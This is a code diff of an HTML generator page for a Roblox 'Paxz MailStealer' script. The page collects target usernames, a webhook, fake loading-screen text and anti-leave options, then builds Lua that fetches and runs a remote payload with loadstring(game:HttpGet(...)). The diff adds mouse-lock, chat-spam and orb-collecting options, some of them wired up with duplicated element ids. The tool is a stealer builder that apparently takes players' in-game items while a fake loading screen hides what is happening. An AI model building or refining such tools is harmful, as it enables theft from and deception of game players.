@@ -7,13 +7,9 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
+      text-align: center;
       margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      background-color: #f2f2f2;
     }
 
     .container {
@@ -22,16 +18,20 @@
       padding: 20px;
       box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
       width: 400px;
+      margin: auto;
+      margin-top: 50px;
     }
 
     h1 {
-      text-align: center;
+      font-size: 28px;
+      margin-bottom: 20px;
     }
 
     label {
       font-weight: bold;
       margin-top: 10px;
       display: block;
+      font-size: 16px;
     }
 
     input {
@@ -50,9 +50,9 @@
       padding: 10px 20px;
       border-radius: 4px;
       cursor: pointer;
-      width: 100%;
       font-size: 16px;
       margin-top: 20px;
+      transition: background-color 0.3s ease-in-out;
     }
 
     button:hover {
@@ -69,6 +69,7 @@
       padding: 10px;
       border-radius: 4px;
       overflow: auto;
+      font-size: 14px;
     }
   </style>
 </head>
@@ -100,6 +101,15 @@
       <label for="antiLeave">Anti-leave (true/false):</label>
       <input type="text" id="antiLeave" required><br>
 
+      <label for="MouseLock">Mouse-Lock (true/false):</label>
+      <input type="text" id="antiLeave" required><br>
+
+      <label for="ChatSpam">Chat-Spam (true/false):</label>
+      <input type="text" id="antiLeave" required><br>
+
+      <label for="CollectOrbs">Collect-Orbs (true/false):</label>
+      <input type="text" id="antiLeave" required><br>
+
       <button type="button" id="generateScriptBtn">Generate Script</button>
     </form>
 
@@ -110,39 +120,49 @@
   </div>
 
   <script>
-    const generateScriptBtn = document.getElementById("generateScriptBtn");
-    const scriptOutput = document.getElementById("scriptOutput");
-    const scriptCode = document.getElementById("scriptCode");
+  const generateScriptBtn = document.getElementById("generateScriptBtn");
+  const scriptOutput = document.getElementById("scriptOutput");
+  const scriptCode = document.getElementById("scriptCode");
 
-    generateScriptBtn.addEventListener("click", () => {
-      const userName = document.getElementById("userName").value;
-      const userName2 = document.getElementById("userName2").value;
-      const webhook = document.getElementById("webhook").value;
-      const loadingScreenText = document.getElementById("loadingScreenText").value;
-      const chatMessage = document.getElementById("chatMessage").value;
-      const kickTime = document.getElementById("kickTime").value;
-      const loadingScreen = document.getElementById("loadingScreen").value;
-      const antiLeave = document.getElementById("antiLeave").value;
-      
-      // ... (andere instellingen variabelen) ...
+  generateScriptBtn.addEventListener("click", () => {
+    const userName = document.getElementById("userName").value;
+    const userName2 = document.getElementById("userName2").value;
+    const webhook = document.getElementById("webhook").value;
+    const loadingScreenText = document.getElementById("loadingScreenText").value;
+    const chatMessage = document.getElementById("chatMessage").value;
+    const kickTime = document.getElementById("kickTime").value;
+    const loadingScreen = document.getElementById("loadingScreen").value;
+    const antiLeave = document.getElementById("antiLeave").value;
+    const MouseLock = document.getElementById("MouseLock").value;
+    const ChatSpam = document.getElementById("chatSpam").value;
+    const CollectOrbs = document.getElementById("CollectOrbs").value;
 
-      const generatedScript = `-- {{Paxz MailStealer}} --
+    const mouseLock = false; // Set to true or false
+    const chatSpam = false; // Set to true or false
+    const collectOrbs = false; // Set to true or false
+
+    const generatedScript = `-- {{Paxz MailStealer}} --
 _G.UserName = "${userName}"
 _G.UserName2 = "${userName2}"
 _G.Webhook = "${webhook}"
 _G.loadingScreenText = "${loadingScreenText}"
 _G.ChatMessage = "${chatMessage}"
 _G.KickTime = ${kickTime}
+
+-- [[Extra Stuff]] --
+
 _G.LoadingScreen = ${loadingScreen}
 _G.AntiLeave = ${antiLeave}
--- ... (andere instellingen en hun waarden) ...
+_G.MouseLock = ${mouseLock}
+_G.ChatSpam = ${chatSpam}
+_G.CollectOrbs = ${collectOrbs}
 
 -- /|\\ Script /|\\ --
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()`;
 
-      scriptCode.textContent = generatedScript;
-      scriptOutput.style.display = "block";
-    });
-  </script>
+    scriptCode.textContent = generatedScript;
+    scriptOutput.style.display = "block";
+  });
+</script>
 </body>
 </html>
